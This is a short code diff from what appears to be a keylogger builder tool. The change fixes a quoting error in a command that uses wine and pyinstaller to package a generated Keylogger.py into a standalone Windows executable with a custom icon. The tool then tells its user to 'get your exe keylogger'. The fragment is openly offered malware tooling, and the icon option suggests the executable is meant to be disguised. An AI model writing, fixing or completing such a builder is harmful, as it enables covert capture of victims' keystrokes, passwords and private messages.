@@ -50,7 +50,7 @@ def main(argv):
 		writefcontent("Keylogger.py",klgstr)
 		print(getfcontent("Keylogger.py"))
 		if sys.platform != "win32":
-			os.system("sudo wine pyinstaller --onefile --icon='" + iconfile + ""' --hidden-import='/root/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Lib/site-packages/pywin32_system32/pywintypes32.dll' Keylogger.py")
+			os.system("sudo wine pyinstaller --onefile --icon='" + iconfile + "' --hidden-import='/root/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Lib/site-packages/pywin32_system32/pywintypes32.dll' Keylogger.py")
 			print("open dist folder and get your exe keylogger ")
 	else:
 		print('Not implemented yet')
